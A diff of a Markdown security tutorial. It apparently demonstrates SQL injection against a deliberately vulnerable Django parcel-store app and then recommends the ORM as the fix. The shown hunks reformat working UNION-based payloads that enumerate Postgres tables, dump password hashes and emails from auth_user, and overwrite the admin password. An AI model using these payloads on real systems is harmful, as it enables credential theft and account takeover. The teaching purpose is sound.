@@ -68,30 +68,42 @@ number of returned values must match and values in the same column of different 
 the same type, unless it is `NULL` value. We will use this `NULL` value exception to check how many
 values are returned in the query. On the search results we can see three paragraphs, so it is
 logical to conclude that query returns three values. Let's try 
-`Warszawa%%' UNION SELECT NULL, NULL, NULL; --`. It does not work and site crashes.
-Maybe some field is not displayed, let's try it with one more
-`NULL`: `Warszawa%%' UNION SELECT NULL, NULL, NULL, NULL; --`. Yaay(not yaay for fake carrier),
-that is working.
+```
+Warszawa%%' UNION SELECT NULL, NULL, NULL; --
+```
+It does not work and site crashes. Maybe some field is not displayed, let's try it with one more
+`NULL`:
+```
+Warszawa%%' UNION SELECT NULL, NULL, NULL, NULL; --
+```
+Yaay(not yaay for fake carrier), that is working.
 
 ![img_1.png](images/img_1.png).
 
 Now it may be useful to know on what database we are operating. Most of the modern database
 provides some kind of command to check it. Let's skip part of guessing and with the knowledge
 that this app is using postgres let's search for
-`Warszawa%%' UNION SELECT NULL, version(), NULL, NULL; --`.
+```
+Warszawa%%' UNION SELECT NULL, version(), NULL, NULL; --
+```
 
 ![img_2.png](images/img_2.png)
 
 Now that we know we are operating on postgres we may want to check for tables and columns of that
 tables. For the tables we need to query postgres specific table of tables and for the `table_name`
 column in that table:
-`Warszawa%%' UNION (SELECT NULL, table_name, NULL, NULL FROM information_schema.tables); --`.
+```
+Warszawa%%' UNION (SELECT NULL, table_name, NULL, NULL FROM information_schema.tables); --
+```
 Wow, now we have some information. Table `auth_user` seems to be interesting, let's see what
 columns are on that table using
-`Warszawa%%' UNION (SELECT NULL, column_name, NULL, NULL FROM information_schema.columns 
-WHERE table_name = 'auth_user'); --`. `password` and `email` seems to be really secret data
-even if password is hashed, let's check that with
-`Warszawa%%' UNION (SELECT NULL, password, email, NULL FROM auth_user); --`.
+```
+Warszawa%%' UNION (SELECT NULL, column_name, NULL, NULL FROM information_schema.columns WHERE table_name = 'auth_user'); --
+```
+`password` and `email` seems to be really secret data even if password is hashed, let's check that with
+```
+Warszawa%%' UNION (SELECT NULL, password, email, NULL FROM auth_user); --
+```
 
 ![img_4.png](images/img_4.png)
 
@@ -101,8 +113,9 @@ the rainbow table and algorithms are secure. We may also want to search the data
 sensitive information, but we may also have some fun and just change the password for the admin :)
 Standard SQL `UPDATE` command does not return changed values, but to fit into 4 values we may use
 a trick with `RETURNING` command to return altered columns. Let's try
-`Warszawa%%'; UPDATE auth_user set password = 'hacker_was_here' WHERE email = 'admin@example.com' 
-RETURNING id, password, email, NULL; --`.
+```
+Warszawa%%'; UPDATE auth_user set password = 'hacker_was_here' WHERE email = 'admin@example.com' RETURNING id, password, email, NULL; --
+```
 
 ![img_5.png](images/img_5.png)
 
@@ -121,7 +134,7 @@ is why Django ORM is always advised option to communicate with database.
 In this case it is pretty straightforward. Django documentation advises usage of ORM methods,
 because they are fully secure and cannot be implemented in insecure way. Each query is
 parametrized by default. Usage of ORM for searching for parcel store address can be seen in
-`parcel_store.utils.get_parcel_stores_filtered_by_address_with_orm`.
+`parcel_store.utils.get_parcel_stores_filtered_by_address_with_orm`
 
 ## 6.2 Manager raw method
 Using manager raw method is not advised in Django documentation, because query is passed
